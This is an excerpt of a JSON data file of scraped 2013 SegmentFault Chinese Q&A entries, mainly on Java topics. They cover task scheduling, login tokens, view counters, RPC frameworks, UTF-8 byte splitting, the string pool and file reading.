      "tags": [
        "java",
        "jdbc",
        "json"
      ],
      "time": "2013-03-19",
      "title": "java中怎么吧jdbc查询的resultset对象转为json",
      "url": "https://segmentfault.com/q/1010000000180427"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000202505\">\n<p>最近工作上需要设计一个动态调度系统，当然不是在spring中配置固定执行的CronJob。这些任务需要做持久化，当服务器正常或者非正常关闭时任务都不会丢。看到Sonartype Nexus中的任务控制是比较完整的，但是没有源码看不到怎样实现的。</p>\n<blockquote>\n<p>应用场景1：用户可以在界面上定制一个提醒，当时间到了会发送邮件。用户还可以修个这个提醒的触发时间。</p>\n<p>应用场景2：每天晚上定时生成订单信息，发送到指定服务器。但是有时候可能需要提前进行完成这个任务。所以可以手工执行某个任务。</p>\n</blockquote>\n</div>",
      "favourite": "2",
      "glance": "1.7k",
      "tags": [
        "java",
        "quartz"
      ],
      "time": "2013-05-19",
      "title": "怎样设计动态调度系统",
      "url": "https://segmentfault.com/q/1010000000202505"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000211401\">\n<p>感谢启发啊，微信公共平台那个类似的验证，我倒是觉得可以尝试下（不讨论微信低俗的设计哈）</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000213155\">\n<p>最好的方式是UUID，安全</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000211174\">\n<p>先访问验证接口。接口输出一个根据用户信息生成的token（内容格式随意）和uid。然后后边的每次提交提交token和uid，服务端验证即可。</p>\n<p>token生成可以根据useragent等客户端信息来生成。</p>\n</div>",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000211134\">\n<p>在做客户端和服务端的交互，但是因为是新手所以不是很了解。\n想着如果客户端每次请求都要带用户名和密码很不现实，所以应该存在一种机制，服务端生成token，返回给客户端，客户端凭借这个token请求相应的接口。\n知道有个Oauth授权框架，但是我只涉及到自己的客户端和服务端，并没有第三方，不知道token怎么取得？\n各位还有没有其他的方法可以推荐？</p>\n</div>",
      "favourite": "2",
      "glance": "25.6k",
      "tags": [
        "安全",
        "android",
        "java",
        "oauth"
      ],
      "time": "2013-06-08",
      "title": "安全登陆怎么生成token？",
      "url": "https://segmentfault.com/q/1010000000211134"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000255581\">\n<p>实现机制不太了解，但一般计数不太可能直接存在数据库中，可以是放在 redis 或者什么里面吧。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000255890\">\n<p>每次浏览将浏览数+1，放入缓存中。然后后台某个线程定时将缓存中的值写入到数据库中。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000255627\">\n<p>我理解的，像这种数据量大的读写肯定是分离的。\n那个实现应该是有人打开界面，界面里的所有微博阅读数全部加1，所以，并不是一个很准确的数据。</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000255565\">\n<p>RT，每条微博的信息应该是存在数据库的吧，每当有人浏览，浏览次数就加一，这是怎么实现的？\n数据从数据库读取这个过程怎么保证读写安全呢？</p>\n</div>",
      "favourite": "4",
      "glance": "2.9k",
      "tags": [
        "编程",
        "java",
        "程序员"
      ],
      "time": "2013-07-18",
      "title": "微博的浏览次数是怎么实现的？",
      "url": "https://segmentfault.com/q/1010000000255565"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000468348\">\n<p>淘宝HSF,阿里搞套dubbo,淘宝主推hsf</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000610060\">\n<p>亚马逊Coral</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000258425\">\n<p>直接对等的我没有用过。不过现在公司在用。大范围的使用。另外dubbo支持多种协议，不光光是http，rmi, memcached 等协议。速度还可以吧。觉得这个应该不会太成为整个系统的瓶颈。</p>\n</div>",
      "attention": "2",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000257319\">\n<p>我们想把负责查询数据库的核心部分做成服务api，供下面的各个子业务平台调用，http有些慢，有朋友推荐“阿里的dubbo分布式rpc框架”，不过没人用过，不知道有什么缺点，也没找到其他框架，想问问大家，类似这种rpc的SOA框架还有什么？dubbo是否是唯一的选择？谢谢。</p>\n</div>",
      "favourite": "3",
      "glance": "19.4k",
      "tags": [
        "java",
        "soa",
        "dubbo",
        "互联网",
        "服务器端"
      ],
      "time": "2013-07-24",
      "title": "JAVA类似阿里dubbo的框架还有哪些？",
      "url": "https://segmentfault.com/q/1010000000257319"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "2",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000259590\">\n<p>java实现rss订阅，以及实时推送功能。请问如何实现。大家说说思路。谢谢。</p>\n</div>",
      "favourite": "3",
      "glance": "2.4k",
      "tags": [
        "java",
        "实时"
      ],
      "time": "2013-07-30",
      "title": "java实现rss订阅，以及实时推送功能",
      "url": "https://segmentfault.com/q/1010000000259590"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000262630\">\n<p>楼主, java里字符串不能这么乱搞的啊.</p>\n<p>比方说, 一个汉字, 内码unicode转utf8, 三个字节a,b,c, 那么你去按两个字节(ab), 一个字节(c)这样来解码utf8到unicode, 得到的是两个 \"replacement character �\", <strong>信息在这里丢失了</strong></p>\n<p>写个test给你吧.</p>\n<pre><code>@Test\npublic void fdfa() throws Exception{\n    byte[] bytes=\"中\".getBytes(\"utf8\");\n    System.out.println(bytes.length);  //3\n    byte[] b=new byte[2];\n    System.arraycopy(bytes, 0, b, 0, 2);\n    String s=new String(b,\"utf8\"); // s为�\n    System.out.println(s); //打印?\n}\n</code></pre>\n<p>具体原因呢, 得看一下utf8的编码:\n<a href=\"http://en.wikipedia.org/wiki/UTF-8\" rel=\"nofollow\">http://en.wikipedia.org/wiki/UTF-8</a></p>\n<p>对于三字节的编码来说, 是这个样子的:\n    1110xxxx    10xxxxxx    10xxxxxx\n你只给了1110xxxx    10xxxxxx, java表示很无力, 没办法解码utf8, 所以就给了一个�.</p>\n<p><strong>总结一下, 一定按编码格式去 正确 编解码. 否则信息会丢失!</strong></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000262684\">\n<p>楼上正解</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000262481\">\n<ul>\n<li>首先，将string转换成byte流的时候，一定要指定编码(<code>content.getBytes(utf-8)</code>)，否则在传输的时候，很有可能就是个杯具；</li>\n<li>其次，<code>arr[arrIndex]+=((char)bytes[i])</code>这个代码，在Java里面可以通过+=运算符将string和char相加？</li>\n<li>同上代码，对于双字节编码(例如中文)，bytes[i]可能会是一个负数，强制转型成char，由于char的取值范围是0〜(2^16)-1，故此时会转换成一个正值，这样拆分后必然出现乱码，而且这个转换不一定是可逆的，此时再也无法由char恢复byte了，所以拆分后自然无法恢复。</li>\n</ul>\n<p>解决办法：如果是要跨JVM传输，建议直接传输byte数组，然后重组；如果不跨JVM传输，可先重组成string，然后传输，不过不是特殊需要，还是建议传输byte数组，最终在接收端重组。在这个过程中，有一点切记：<strong>转换过程中务必指定编码</strong>。这是我们项目组血的教训，后来重申的重要原则之一。</p>\n<pre><code>byte[] array = content.getBytes(\"utf-8\");    // 发送端\nString content = new String(array, \"utf-8\");   // 接收端\n</code></pre>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000262463\">\n<p>是这样的一个方法</p>\n<pre><code>public static String[] splitByByteSize(String content, int size){\n    byte[] bytes = content.getBytes();\n    int totalSize = bytes.length;\n    int partNum = 0;\n    if(totalSize == 0){\n        return new String[0];\n    }\n    if(totalSize % size == 0){\n        partNum = totalSize / size;\n    }else{\n        partNum = totalSize / size + 1;\n    }\n    String[] arr = new String[partNum];\n    int arrIndex = -1;\n    for(int i=0;i&lt;totalSize;i++){\n        if(i%size == 0){\n            arrIndex++;\n            arr[arrIndex] = \"\";\n        }\n        arr[arrIndex]+=((char)bytes[i]);\n    }\n    return arr;\n\n}\n\n\nString s[] = splitByByteSize(\"水\",15);\n    int byteLen = 0;\n    for(int i=0;i&lt;s.length;i++){\n        byteLen+=s[i].getBytes().length;\n    }\n    byte[] bytes = new byte[byteLen];\n    int offset = 0;\n    for(int i=0;i&lt;s.length;i++){\n        System.arraycopy(s[i].getBytes(), 0, bytes, offset, s[i].getBytes().length);\n        offset += s[i].getBytes().length;\n    }\n    System.out.println(\"--\"+new String(bytes));\n</code></pre>\n<p>按字节拆分后等字节的放到String数组中。另外有个方法接收String数组后在拼成content原来的值。现在是如果有中文，按字节拆分会有乱码。但是感觉后面按照String数组拼成字符串应该不会乱码。但是还是乱码。请问怎么做才能在用返回的String数组拼成字符串不乱码。</p>\n<pre><code>public static void main(String[] args) throws UnsupportedEncodingException {\n    String arr[] = splitByByteSize(\"abc刘defghijklmnopqrstuvwxyz\",4);\n    int byteLen = 0;\n    for(int i=0;i&lt;arr.length;i++){\n        byteLen+=arr[i].getBytes().length;\n    }\n    byte[] bytes = new byte[byteLen];\n    int offset = 0;\n    for(int i=0;i&lt;arr.length;i++){\n        System.arraycopy(arr[i].getBytes(\"utf-8\"), 0, bytes, offset, arr[i].getBytes(\"utf-8\").length);\n        offset += arr[i].getBytes(\"utf-8\").length;\n    }\n\n    System.out.println(\"&gt;&gt;\"+new String(bytes));\n}\n\npublic static String[] splitByByteSize(String content, int size) throws UnsupportedEncodingException{\n    byte[] bytes = content.getBytes(\"utf-8\");\n    int totalSize = bytes.length;\n    int partNum = 0;\n    if(totalSize == 0){\n        return new String[0];\n    }\n    if(totalSize % size == 0){\n        partNum = totalSize / size;\n    }else{\n        partNum = totalSize / size + 1;\n    }\n    String[] arr = new String[partNum];\n    int offset = 0;\n    byte newBytes[] = new byte[size];\n    for(int i=0;i&lt;partNum-1;i++){\n        System.arraycopy(bytes, offset, newBytes, 0, size);\n        arr[i] = new String(newBytes,\"utf-8\");\n        offset += size;\n    }\n    System.arraycopy(bytes, offset, newBytes, 0, totalSize-offset);\n    arr[partNum-1] = new String(newBytes,\"utf-8\");\n    return arr;\n\n}\n</code></pre>\n<p>上面是新代码，但是还有有乱码</p>\n</div>",
      "favourite": "2",
      "glance": "5k",
      "tags": [
        "java"
      ],
      "time": "2013-08-07",
      "title": "java按字节拆分字符串 后在拼成字符串",
      "url": "https://segmentfault.com/q/1010000000262463"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000302678\">\n<p>如题，怎么实现将<strong>html中的内容加css样式</strong>导出生成word文档？最好在前端生成</p>\n</div>",
      "favourite": "0",
      "glance": "1.3k",
      "tags": [
        "javascript",
        "jquery",
        "java"
      ],
      "time": "2013-09-02",
      "title": "HTML 2 WORD",
      "url": "https://segmentfault.com/q/1010000000302678"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000304968\">\n<p>根据java的语法，非静态内部类不可以有静态成员的声明，如</p>\n<pre><code>class Laptop {\n    // non-static inner class\n    class Battery {\n        private static String vendor = \"Lenovo\";\n    }\n}\n</code></pre>\n<p>是不能编译通过的。</p>\n<p>但是如果声明 Battery 的成员 vendor 为 <code>final</code>, 如：</p>\n<pre><code>class Laptop {\n    // non-static inner class\n    class Battery {\n        private static final String vendor = \"Lenovo\";\n    }\n}\n</code></pre>\n<p>就可以编译通过，为什么呢？</p>\n</div>",
      "favourite": "3",
      "glance": "4k",
      "tags": [
        "java"
      ],
      "time": "2013-09-08",
      "title": "为什么java非静态内部类可以有static final的数据成员？",
      "url": "https://segmentfault.com/q/1010000000304968"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "2",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000320106\">\n<html><body><p>设计一个智能解答系统。用户在前端输入搜索的问题，智能推荐解答问题的方法。我的设计是三张表  一张问题、答案表；一张关键字表；一张问题和关键字对应关系表。如下图：\n<img data-src=\"http://segmentfault.com/img/bVbvq8\">\n查找问题时先将问题进行分词，然后到关键字表查找关键字的id然后到问题关键字对应表中查找和关键字的对应关系，然后找到和所提供的关键字对应最多的问题 进而找到最优的问题ID靠前展示给用户。面试官说这样的设计不合理。请问怎么才算合理？</img></p></body></html>\n</div>",
      "favourite": "2",
      "glance": "2.3k",
      "tags": [
        "java",
        "人工智能"
      ],
      "time": "2013-10-15",
      "title": "某大牛公司笔试系统设计题，店小二智能问答实现设计",
      "url": "https://segmentfault.com/q/1010000000320106"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000331686\">\n<p>object oriented，面向對象，簡單來說，是一種編程的套路。</p>\n<h2>什麼是編程的套路</h2>\n<p>編程(programing)，就是利用已有的信息產生新的信息。</p>\n<p>具體來說，我們首先將已有的信息轉化成數據（Data），然後通過操作這些數據，得出新的數據，新的數據就包含了新的信息。操作這些數據的方法，我們稱之爲函數（Function）。</p>\n<p>從這個角度來說，程序(program)就是一堆數據和函數，編程就是設計和組織數據和函數。</p>\n<p>不同的設計和組織的方式，就叫做編程的套路，或者說，範式（paradigm）。其中，面向對象就是範式之一。</p>\n<h2>面向對象的基本原理</h2>\n<p>面向對象的核心，就是將某些數據和用於操作這些數據的函數封裝（encapsulate）在一起。</p>\n<p>被封裝進對象的函數，稱爲該對象的方法（method）。</p>\n<p>因爲數據和函數都被封裝進對象了，所以當我們需要操作某些數據的時候，我們就向相應的對象傳遞一個消息（pass a message)，要求這個對象返回我們需要的答案。對象收到消息後，調用封裝在自身內部的方法，計算出答案，然後回傳給我們一個包含答案的消息。</p>\n<p>以上就是「面向對象」的基本原理。</p>\n<h2>面向對象的好處</h2>\n<p>「面向對象」的好處把數據和相應的函數封裝在一起，達到界面和實現的分離。這樣的話，下層的改動不會影響上層。我們前面已經說了，對象內部的方法，本質上是函數，這個函數的定義，我們稱爲方法的實現。只要這個方法對外提供的接口沒有變，那麼對對象內部的方法的實現（也就是函數定義）的改變，不會影響程序的其他部分。</p>\n<p>當然，面向對象也有壞處。最突出的是，如果一味強調「一切都是對象」，強迫所有的編程都按照面向對象的套路來，完全不允許其他套路，就會導致一些繁瑣的設計。</p>\n<h2>面向對象的其他概念</h2>\n<p>理解了基本原理，再理解其他概念就容易了。</p>\n<p>如果有一些對象是相似的，那麼相應地，操作它們的函數（方法）應該也是相似的。這時如何共享方法，避免重複？</p>\n<p>一種思路是引入類（class）這個概念，就是將相似的對象都作爲一類。然後類也是對象，也有綁定的函數或者方法。這些類的方法，可以被屬於該類的對象們共享。同理，相似的類，還可以歸到更大的類去。這就形成了父類和子類的概念。子類可以繼承父類的方法，同理，可以繼承爺爺類（父類的父類）的方法。</p>\n<p>上面是單線的繼承，就是說一個類只能從自己的祖先那裏繼承方法。這有時不方便。一種思路是允許一個類有多個父類，這是多重繼承。另一種思路是允許類從其他類借用方法，這是mixin。</p>\n<p>和類相對的思路，是引入原型(prototype)的概念。如果A對象和B對象相似，用類來處理，那就是構造一個類C，然後將A和B作爲類C的兩個實例。如果用原型來處理，那就是以A作爲原型，構造一個B。</p>\n<p>在這兩條思路的基礎上，又形成了更多的概念，以及相應的一些編程的慣例，這裏就不介紹了。</p>\n<p>至於具體的編程語言，是否提供機制可以實現面向對象編程，是否原生支持面向對象，以何種方式支持，是否只支持面向對象編程，那是另一個問題。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000326946\">\n<p>继续抛砖引玉……</p>\n<p>就是面向对象的意思。区别于面向过程等编程模式。可以参看<a href=\"http://baike.baidu.com/link?url=IYzAlc-ywLzNSDy9VGGchifB9Bmp4eIe2X50A2MOOFK8q8lexUOzJxEQxun9Nus2\" rel=\"nofollow\">百度百科</a></p>\n<p>可以参看Head First Java/Head First C#</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000327069\">\n<h4>什么是面向对象？</h4>\n<p>我们在看待现实世界的问题时，会发现任何一个事物有自身的属性，标志了TA是什么，还有这个事物的行为，用来和其他事物进行交互。<br/>\n面向对象就是这么一种思想，建模时，将问题抽象成很多对象。通过对象之间的交互将问题解决。  </p>\n<h4>为什么要面向对象？</h4>\n<p>面向对象的优点主要在两个方面:   </p>\n<ol>\n<li><p>我们日常生活的思维模式也是面向对象的，我们常常会说，谁谁谁能做什么，给TA相应的需求，TA就是个对象。在需求分析时，比较容易建模。   </p></li>\n<li><p>程序实现之后，具有比较好的可维护性，可重用性和可扩展性。<br/>\n因为对象是独立的，所以A项目中用TA可以，B项目也可以用TA，我们也可以通过继承来对对象进行扩展改变。<br/>\n因为对象是封装的，所以除非接口发生变化，否则对象内部实现的变化并不会影响与外部的交互。</p></li>\n</ol>\n<h4>怎么学习面向对象？</h4>\n<ul>\n<li>掌握封装，继承，多态这几个基本概念，从日常生活中去思考理解</li>\n<li>学习设计模式</li>\n</ul>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000326938\">\n<p>我目前在英国读大一计算机，是个超级菜鸟，我不太明白什么是object oriented。。。中文翻译过来似乎是面向对象（有可能翻译错了）。 我搜索过有关于他的解释，但是还是不是很明白，都解释的太专业了，请问又问能够很简单明了并且完整的给我解释一下什么是object oriented么？\n谢谢大家了</p>\n</div>",
      "favourite": "1",
      "glance": "2.2k",
      "tags": [
        "object-oriented",
        "java"
      ],
      "time": "2013-10-29",
      "title": "什么是object oriented?",
      "url": "https://segmentfault.com/q/1010000000326938"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000330221\">\n<p>只要是<strong>IaaS</strong>这类就可以，例如AWS的EC2</p>\n<blockquote>\n<p>美国国家标准和技术研究院的云计算定义中明确了三种服务模式：</p>\n<p><strong>软件即服务（SaaS）</strong>：消费者使用应用程序，但并不掌控操作系统、硬件或运作的网络基础架构。是一种服务观念的基础，软件服务供应商，以租赁的概念提供客户服务，而非购买，比较常见的模式是提供一组账号密码。例如：Microsoft CRM与Salesforce.com</p>\n<p><strong>平台即服务（PaaS）</strong>：消费者使用主机操作应用程序。消费者掌控运作应用程序的环境（也拥有主机部分掌控权），但并不掌控操作系统、硬件或运作的网络基础架构。平台通常是应用程序基础架构。例如：Google App Engine。</p>\n<p><strong>基础架构即服务（IaaS）</strong>：消费者使用“基础计算资源”，如处理能力、存储空间、网络组件或中间件。消费者能掌控操作系统、存储空间、已部署的应用程序及网络组件（如防火墙、负载平衡器等），但并不掌控云基础架构。例如：Amazon AWS、Rackspace。</p>\n</blockquote>\n<p>来源：\n1、 <a href=\"http://zh.wikipedia.org/wiki/%E9%9B%B2%E7%AB%AF%E9%81%8B%E7%AE%97\" rel=\"nofollow\">http://zh.wikipedia.org/wiki/%E9%9B%B2%E7%AB%AF%E9%81%8B%E7%AE%97</a></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000330338\">\n<p>想做聊天系统是吧，用底层的socket开发或许有点麻烦，你可以尝试<a href=\"http://socket.io/\" rel=\"nofollow\">socket.io</a>，并在BAE、SAE上搭建。<br/>\n这个东西似乎非常适合做聊天软件。</p>\n<p>服务端  </p>\n<pre><code class=\"lang-javascript\">var io = require('socket.io').listen(80);\n\nio.sockets.on('connection', function (socket) {\n  socket.emit('news', { hello: 'world' });\n  socket.on('my other event', function (data) {\n    console.log(data);\n  });\n});\n</code></pre>\n<p>客户端</p>\n<pre><code class=\"lang-javascript\">&lt;script src=\"/socket.io/socket.io.js\"&gt;&lt;/script&gt;\n&lt;script&gt;\n  var socket = io.connect('http://localhost');\n  socket.on('news', function (data) {\n    console.log(data);\n    socket.emit('my other event', { my: 'data' });\n  });\n&lt;/script&gt;\n</code></pre>\n<p>在客户端里，他会采取以下方式和服务器连接：</p>\n<ul>\n<li>WebSocket</li>\n<li>Adobe® Flash® Socket</li>\n<li>AJAX long polling</li>\n<li>AJAX multipart streaming</li>\n<li>Forever Iframe</li>\n<li>JSONP Polling</li>\n</ul>\n<p>所以浏览器兼容方面题主应该不比太操心，官方表示连Internet Explorer 5.5都支持。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000330213\">\n<p>感性的来看，云平台或虚拟主机空间，基本都不会提供<strong>主动运行守护进程</strong>的功能。</p>\n<p>你的需求恐怕需要VPS。掏钱吧。</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000330210\">\n<p>目前想做一个聊天系统，服务端得要公网ip，所以想找一些网上的空间来托管我的服务端，但是找了sae，bae之类，无论哪种语言（java，node.js，python等）都不支持socket监听。我想用socket来搭建一个TCP的服务端啊，怎么才可以搭建？</p>\n</div>",
      "favourite": "4",
      "glance": "8.1k",
      "tags": [
        "socket服务端",
        "node.js",
        "java",
        "python",
        "聊天系统"
      ],
      "time": "2013-11-04",
      "title": "有哪些云平台（比如sae，bae之类）支持socket监听的，想做一个聊天系统。",
      "url": "https://segmentfault.com/q/1010000000330210"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000338220\">\n<p>Java Doc:</p>\n<p>\"When the intern method is invoked, if the pool already contains a string equal to this String object as determined by the equals(Object) method, then the string from the pool is returned. Otherwise, this String object is added to the pool and a reference to this String object is returned. \"</p>\n<p>就是说, 在调用str.intern()时, 首先去pool中找是否有 equals(str)==true的字符串. 找到后返回已存在于pool里的字符串, 否则把str加入pool中. </p>\n<p>所以在pool里, 相等的字符串 只会有一份.</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000338447\">\n<p>可能我问题有点问题~，“运行时常量池是方法去的一部分，Class文件中除了有类的版本、字段、方法、接口等描述信息外，还有一项信息就是常量池，用于存放编译器生成的各种字面量和符号引用，这部分内容在类加载后存放在方法区的运行时常量池中。”具体答案知道了~<strong>class文件信息中的常量池只是对运行时常量池的一个引用</strong></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000338612\">\n<p>每个类中的常量池：</p>\n<blockquote>\n<p>java的每一个类都有一个常量池，这个常量池定义在.class文件中有描述，包括整形、浮点型、字符串、类名、属性名、方法声明等。在jvm装载.class文件时，会装载这些常量池信息，并按照JMM(java存储模型)的定义，在方法区(即常说的PermGen Space[永久代])中开辟一块内存空间，用以存储这些常量。</p>\n</blockquote>\n<p>需要注意的是：</p>\n<blockquote>\n<p>java同时会在方法区维持一个string pool，在装载常量池的字符串型常量时，会先将这些字符串常量存储到string pool中，然后返回其引用给每个类的常量池。</p>\n</blockquote>\n<p>至于String.intern()方法，引用其JavaDoc：</p>\n<blockquote>\n<p><strong>A pool of strings, initially empty, is maintained privately by the\n  class <code>String</code>.</strong></p>\n<p>When the intern method is invoked, if the pool already contains a\n  string equal to this <code>String</code> object as determined by\n  the {@link #equals(Object)} method, then the string from the pool is\n  returned. Otherwise, this <code>String</code> object is added to the\n  pool and a reference to this <code>String</code> object is returned.</p>\n<p>It follows that for any two strings <code>s</code> and <code>t</code>,\n  <code>s.intern() == t.intern()</code> is <code>true</code>\n  if and only if <code>s.equals(t)</code> is <code>true</code>.</p>\n</blockquote>\n<p>加粗标明的行也说明了java在方法区中会维持string pool。至于为什么</p>\n<blockquote>\n<p><code>A.StringA.intern()==B.StringB.intern()</code>会返回true</p>\n</blockquote>\n<p>相信你看了javaDoc会明白。</p>\n<p><strong>PS</strong>：不光String类有JVM原生支持的常量池，Boolean、Byte、Character、Short、Integer、Long这六种原始类型包装类，也实现了代码级的常量池，具体可参考JDK源码。<br/>\n<strong>PPS</strong>：可供参考<a href=\"http://baike.baidu.com/link?url=-KTJnX9Q_BJ4WOaLoHyIleKVrw2iRJZQ42vWBQ9rb-_bud1waNSDPbrJOwXlyGmeR5SykvXuXcwgI67lw5g2rK\" rel=\"nofollow\">常量池</a></p>\n</div>",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000338040\">\n<p>Java虚拟机中,每个类都有一个常量池,StringPool存在常量池中，对于A.StringA.intern()==B.StringB.intern()应该返回False~~可是我打出来的是True，Why？</p>\n</div>",
      "favourite": "2",
      "glance": "1.7k",
      "tags": [
        "java"
      ],
      "time": "2013-11-18",
      "title": "Java的StringPool是存放在方法区中,是所有类共享的吗?",
      "url": "https://segmentfault.com/q/1010000000338040"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000342188\">\n<p>刚刚学JAVA，在做ACM，<strong>让用EOF结束，JAVA直接跪了。</strong></p>\n<p><strong>Description</strong></p>\n<p>每个工人的总工作时间是由许多散的时间加在一起得到的，而分钟是每到60清零，然后小时数加1。但是工作时间能手动清零。</p>\n<p>你的任务是编写一个程序每次询问，都能马上算出这个工人的工作时间。</p>\n<p><strong>Input</strong></p>\n<p>多组数据输入。<br/>\n每行有三种输入情况。</p>\n<ol>\n<li>输入一个小时制的时间，格式为h:m。（0 &lt;= h &lt;= 100, 0 &lt;= m &lt;= 60)</li>\n<li>输'='，表示询问此时的累计工作时间。</li>\n<li>输入'!'，表示清零以上此工人的工作时间。</li>\n</ol>\n<p>输入以EOF结束。</p>\n<p><strong>Output</strong></p>\n<p>对'='每次询问，输出当前的小时累计数。</p>\n<p>Sample Input</p>\n<pre><code>3:43  \n1:29  \n3:24  \n2:59   \n=  \n!  \n=  \n</code></pre>\n<p>Sample Output</p>\n<pre><code>11:35  \n0:0\n</code></pre>\n</div>",
      "favourite": "0",
      "glance": "4.9k",
      "tags": [
        "java"
      ],
      "time": "2013-11-23",
      "title": "在JAVA中怎么实现输入以EOF结束？",
      "url": "https://segmentfault.com/q/1010000000342188"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000360077\">\n<p>可以使用 <a href=\"http://commons.apache.org/proper/commons-io/\" rel=\"nofollow\">commons-io</a> 的 <a href=\"http://commons.apache.org/proper/commons-io/javadocs/api-2.4/org/apache/commons/io/FileUtils.html\" rel=\"nofollow\">FileUtils</a>:</p>\n<p>LineIterator:</p>\n<pre><code class=\"lang-java\">import org.apache.commons.io.FileUtils;\nimport org.apache.commons.io.LineIterator;\n\nfinal LineIterator it = FileUtils.lineIterator(new File(\"\"), \"UTF-8\");\ntry {\n    while (it.hasNext()) {\n        final String line = it.nextLine();\n    }\n} finally {\n    it.close();\n}\n</code></pre>\n<p>如果内存足够:</p>\n<pre><code class=\"lang-java\">import org.apache.commons.io.Charsets;\nimport org.apache.commons.io.FileUtils;\n\nfinal List&lt;String&gt; lines = FileUtils.readLines(new File(\"\"), Charsets.UTF_8);\n</code></pre>\n<hr/>\n<p>另外推荐 LZ 使用 <code>org.apache.commons.io.Charsets.UTF_8</code> 代替字符串的 <code>\"UTF-8\"</code>，如：</p>\n<pre><code class=\"lang-java\">// 不会抛出 UnsupportedEncodingException\nnew InputStreamReader(is, Charsets.UTF_8)\nstr.getBytes(Charsets.UTF_8);\n</code></pre>\n<p>因为 Java 规定了所有平台都必须实现 UTF-8 ，这里本来就不可能抛出 <code>UnsupportedEncodingException</code> 。Java 7 中我们就可以用 <code>java.nio.charset.StandardCharsets</code> 了，Java 6 暂时拿这个顶一下。</p>\n<p>另外 LZ 可以用 <code>org.apache.commons.io.IOUtils.closeQuietly</code> 来关闭一个流。你的 finally 块可以简化为：</p>\n<pre><code class=\"lang-java\">finnaly {\n    IOUtils.closeQuiety(is);\n}\n</code></pre>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000359999\">\n<p>\"  每一个优雅的接口背后，都有一个龌龊的实现 “</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000360171\">\n<p>java当然可以很优雅, 宇宙第一的编程语言也不是光靠sun和oracle忽悠出来的.</p>\n<p>这里 我们需要把 文件处理 的逻辑 和 业务逻辑分开, 引入 strategy 模式是比较合适的. 文件处理的部分是不变的可以重用的, 业务逻辑是变化的.</p>\n<p>还有就是java7 引入 try-with-resource, 已经不需要自己去关闭流了.</p>\n<p>代码:</p>\n<pre><code>public interface FileProcessor {\n    void processByLine(String FilePath, LineProcessor processor);\n}\n\npublic interface LineProcessor {\n    void doSomeThing(String oneLine);\n}\n\npublic class FileProcessorImpl implements FileProcessor {\n\n    @Override\n    public void processByLine(String filePath, LineProcessor processor) {\n        try (BufferedReader br =\n                new BufferedReader(new FileReader(filePath))) {\n                String line = br.readLine();\n                processor.doSomeThing(line.trim());\n        }catch (FileNotFoundException fnfe){\n            fnfe.printStackTrace();\n        }catch (IOException ioe){\n            ioe.printStackTrace();\n        }\n    }\n}\n\npublic class FileProcessImplTest {\n\n    @Test\n    public void testProcessByLine() {\n        final StringBuilder sb=new StringBuilder();\n        final StringBuilder sb1=new StringBuilder();\n        FileProcessor fp=new FileProcessorImpl();\n\n        fp.processByLine(\"a.txt\", new LineProcessor(){\n            @Override\n            public void doSomeThing(String oneLine) {\n                sb.append(oneLine);\n            }\n        });\n\n        fp.processByLine(\"a_reverse_by_line.txt\", new LineProcessor(){\n            @Override\n            public void doSomeThing(String oneLine) {\n                sb1.append(new StringBuilder(oneLine).reverse());\n            }\n        });\n\n        assertEquals(sb.toString(), sb1.toString());\n    }\n\n}\n</code></pre>\n</div>",
      "attention": "1",
